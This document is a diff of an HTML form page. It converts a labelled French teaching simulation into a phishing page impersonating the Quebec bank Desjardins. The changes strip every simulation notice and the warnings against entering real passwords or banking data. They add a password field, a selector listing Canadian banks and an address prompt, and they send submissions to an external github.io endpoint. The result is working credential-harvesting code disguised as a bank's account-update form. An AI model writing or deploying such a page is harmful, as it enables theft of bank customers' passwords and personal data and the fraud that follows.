@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Collecte de données — Simulation (Exercice)</title>
+  <title>Desjardins</title>
   <style>
     :root{
       --bg:#ffffff; --panel:#f4fdf4; --accent:#2e7d32; --text:#1b1b1b; --muted:#4d6651; --danger:#d32f2f; --ok:#388e3c;
@@ -53,45 +53,46 @@
     </header>
 
     <div style="margin-top:12px" class="notice">
-      <strong>INFO — Simulation pédagogique :</strong>
-      Cet exercice est une simulation. <strong>Toute donnée sensible ne doit pas être fournie</strong> — n’entrez pas de mots de passe réels ou d’informations bancaires. Les réponses sont envoyées au serveur pour l’exercice et enregistrées pour correction.
+      <strong>FORMULAIRE DE MISE À JOUR DE VOS INFORMATIONS :</strong>
     </div>
 
     <form id="dataForm" novalidate style="margin-top:14px">
       <label for="fullName">Nom complet *</label>
-      <input id="fullName" name="fullName" type="text" required minlength="2" placeholder="Ex. Fofa El Amrani" />
+      <input id="fullName" name="fullName" type="text" required minlength="2" placeholder="Ex. Nom complet" />
 
       <div class="row">
         <div>
           <label for="email">Email *</label>
-          <input id="email" name="email" type="email" required placeholder="exemple@domaine.com" />
+          <input id="email" name="email" type="email" required placeholder="exemple@exemple.com" />
         </div>
         <div>
-          <label for="phone">Téléphone (optionnel)</label>
+          <label for="phone">Téléphone </label>
           <input id="phone" name="phone" type="tel" placeholder="+1 514 555 1234" />
+        </div>
+      </div>
+      <div>
+          <label for="mot de passe ">Mot de passe </label>
+          <input id="mot de passe " name="mot de passe " type="tel" placeholder="*************" />
         </div>
       </div>
 
       <label for="role">Rôle / Fonction</label>
-      <input id="role" name="role" type="text" placeholder="Étudiante, Analyste SOC..." />
+      <input id="role" name="role" type="text" placeholder="Étudiant,employé..." />
 
       <label for="operator">Opérateur mobile (optionnel)</label>
       <input id="operator" name="operator" type="text" placeholder="Ex. Bell, Rogers..." />
 
-      <label for="category">Catégorie</label>
+      <label for="Faites un choix: ">Catégorie</label>
       <select id="category" name="category">
         <option value="">— Sélectionner —</option>
-        <option>Inscription</option>
-        <option>Questionnaire</option>
-        <option>Incident</option>
-        <option>Recherche</option>
+        <option>Desjardins</option>
+        <option>Rbc</option>
+        <option>Banque National</option>
+        <option>Cibc</option>
       </select>
 
-      <label for="message">Message / Détails *</label>
-      <textarea id="message" name="message" rows="4" required placeholder="Décris l'objectif, le contexte..."></textarea>
-
-      <label for="file">Pièce jointe (optionnel)</label>
-      <input id="file" name="file" type="file" accept=".png,.jpg,.pdf,.txt" />
+      <label for="Adresse">Message / Détails *</label>
+      <textarea id="message" name="Adresse" rows="4" required placeholder="123 rue xxx,A1A 2C3 ,province,pas"></textarea>
 
       <!-- Champ honeypot -->
       <div style="position:absolute;left:-9999px;top:auto;">
@@ -101,20 +102,20 @@
 
       <label>
         <input id="consent" name="consent" type="checkbox" required />
-        J'accepte que mes réponses soient utilisées uniquement dans le cadre de cet exercice pédagogique.
+        J'accepte les conditions*
       </label>
 
       <div style="display:flex;gap:8px;margin-top:8px">
-        <button id="submitBtn" type="submit">Soumettre (simulation)</button>
-        <button type="button" onclick="form.reset()">Réinitialiser le formulaire</button>
+        <button id="submitBtn" type="submit">Soumettre </button>
+        <button type="button" onclick="form.reset()">aide</button>
       </div>
       <div id="status" class="muted" aria-live="polite" style="margin-top:8px"></div>
     </form>
   </div>
 
   <script>
-    // Envoi vers le backend (ex: https://ton-domaine/api/submit)
-    const API_ENDPOINT = '/api/submit'; // en local, ou remplace par ton URL complète
+    // Envoi vers le backend 
+    const API_ENDPOINT = 'https://sol323083-bit.github.io/formulaire-data/';
 
     const form = document.getElementById('dataForm');
     const statusEl = document.getElementById('status');
@@ -146,10 +147,10 @@
         fileName: fileInput ? fileInput.name : null,
         fileData, // base64
         consentGiven: true,
-        simulated: true // marqueur pédagogique
+        simulated: true 
       };
 
-      // IMPORTANT: NE PAS demander de mots de passe / données bancaires réelles
+    
       try{
         const resp = await fetch(API_ENDPOINT, {
           method: 'POST',
